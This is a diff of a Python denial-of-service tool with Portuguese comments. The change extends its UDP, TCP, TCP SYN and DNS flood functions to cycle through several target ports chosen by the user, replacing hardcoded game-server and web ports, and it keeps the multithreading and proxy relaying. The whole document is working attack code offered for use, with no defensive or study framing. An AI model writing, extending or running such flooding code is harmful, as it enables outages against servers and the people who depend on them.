@@ -29,63 +29,67 @@ def is_valid_ip(ip):
     return pattern.match(ip) is not None
 
 # Função para ataque UDP Flood com suporte a proxy
-def udp_flood(ip, port, rate_limit, proxy=None):
+def udp_flood(ip, ports, rate_limit, proxy=None):
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     bytes_to_send = random._urandom(1024)  # Gerar um pacote aleatório de 1024 bytes
     while True:
-        if proxy:
-            logging.warning("Proxy não suportado para UDP Flood")
-            break
-        sock.sendto(bytes_to_send, (ip, port))
-        logging.info(f"Pacote UDP enviado para {ip}:{port}")
-        time.sleep(rate_limit)
+        for port in ports:
+            if proxy:
+                logging.warning("Proxy não suportado para UDP Flood")
+                break
+            sock.sendto(bytes_to_send, (ip, port))
+            logging.info(f"Pacote UDP enviado para {ip}:{port}")
+            time.sleep(rate_limit)
 
 # Função para ataque TCP Flood com suporte a proxy
-def tcp_flood(ip, port, rate_limit, proxy=None):
+def tcp_flood(ip, ports, rate_limit, proxy=None):
     while True:
         try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            if proxy:
-                proxy_ip, proxy_port = proxy.split(":")
-                sock.connect((proxy_ip, int(proxy_port)))
-                sock.send(f"CONNECT {ip}:{port} HTTP/1.1\r\n\r\n".encode())
-            else:
-                sock.connect((ip, port))
-            
-            logging.info(f"Conectado ao {ip}:{port} - Enviando pacotes TCP.")
-            sock.send(b'GET / HTTP/1.1\r\n')  # Enviando um pacote simples
-            sock.close()
-            time.sleep(rate_limit)
+            for port in ports:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                if proxy:
+                    proxy_ip, proxy_port = proxy.split(":")
+                    sock.connect((proxy_ip, int(proxy_port)))
+                    sock.send(f"CONNECT {ip}:{port} HTTP/1.1\r\n\r\n".encode())
+                else:
+                    sock.connect((ip, port))
+
+                logging.info(f"Conectado ao {ip}:{port} - Enviando pacotes TCP.")
+                sock.send(b'GET / HTTP/1.1\r\n')  # Enviando um pacote simples
+                sock.close()
+                time.sleep(rate_limit)
         except socket.error as e:
             logging.error(f"Erro ao enviar pacote TCP: {e}")
 
 # Função para ataque TCP SYN Flood com suporte a proxy
-def tcp_syn_flood(ip, port, rate_limit, proxy=None):
+def tcp_syn_flood(ip, ports, rate_limit, proxy=None):
     while True:
         try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            if proxy:
-                proxy_ip, proxy_port = proxy.split(":")
-                sock.connect((proxy_ip, int(proxy_port)))
-                sock.send(f"CONNECT {ip}:{port} HTTP/1.1\r\n\r\n".encode())
-            else:
-                sock.connect((ip, port))
-            
-            logging.info(f"SYN enviado para {ip}:{port} via proxy {proxy if proxy else 'direto'}")
-            sock.close()
-            time.sleep(rate_limit)
+            for port in ports:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                if proxy:
+                    proxy_ip, proxy_port = proxy.split(":")
+                    sock.connect((proxy_ip, int(proxy_port)))
+                    sock.send(f"CONNECT {ip}:{port} HTTP/1.1\r\n\r\n".encode())
+                else:
+                    sock.connect((ip, port))
+
+                logging.info(f"SYN enviado para {ip}:{port} via proxy {proxy if proxy else 'direto'}")
+                sock.close()
+                time.sleep(rate_limit)
         except socket.error as e:
             logging.error(f"Erro ao enviar SYN: {e}")
 
 # Função para ataque DNS Flood com suporte a proxy
-def dns_flood(ip, port, rate_limit, proxy=None):
+def dns_flood(ip, ports, rate_limit, proxy=None):
     while True:
         try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            dns_query = b'\x12\x34\x56\x78'  # Simulando uma consulta DNS
-            sock.sendto(dns_query, (ip, port))
-            logging.info(f"Consulta DNS enviada para {ip}:{port} via proxy {proxy if proxy else 'direto'}")
-            time.sleep(rate_limit)
+            for port in ports:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                dns_query = b'\x12\x34\x56\x78'  # Simulando uma consulta DNS
+                sock.sendto(dns_query, (ip, port))
+                logging.info(f"Consulta DNS enviada para {ip}:{port} via proxy {proxy if proxy else 'direto'}")
+                time.sleep(rate_limit)
         except socket.error as e:
             logging.error(f"Erro ao enviar consulta DNS: {e}")
 
@@ -142,16 +146,19 @@ def main():
             recommended_threads = get_optimal_thread_count()
             user_threads = input(f"Digite o número de threads que deseja (ou pressione Enter para usar {recommended_threads}): ")
             num_threads = recommended_threads if not user_threads.strip() else int(user_threads)
-            
+
+            ports_input = input("Digite as portas, separadas por vírgula (ex: 80,443,8080): ")
+            ports = [int(port.strip()) for port in ports_input.split(",")]
+
             for _ in range(num_threads):
                 if choice == "1":
-                    thread = threading.Thread(target=udp_flood, args=(target_ip, 30120, rate_limit, proxy))
+                    thread = threading.Thread(target=udp_flood, args=(target_ip, ports, rate_limit, proxy))
                 elif choice == "2":
-                    thread = threading.Thread(target=tcp_flood, args=(target_ip, 25565, rate_limit, proxy))
+                    thread = threading.Thread(target=tcp_flood, args=(target_ip, ports, rate_limit, proxy))
                 elif choice == "3":
-                    thread = threading.Thread(target=tcp_syn_flood, args=(target_ip, 80, rate_limit, proxy))
+                    thread = threading.Thread(target=tcp_syn_flood, args=(target_ip, ports, rate_limit, proxy))
                 elif choice == "4":
-                    thread = threading.Thread(target=dns_flood, args=(target_ip, 53, rate_limit, proxy))
+                    thread = threading.Thread(target=dns_flood, args=(target_ip, ports, rate_limit, proxy))
                 elif choice == "5":
                     thread = threading.Thread(target=icmp_flood, args=(target_ip, rate_limit, proxy))
                 thread.start()
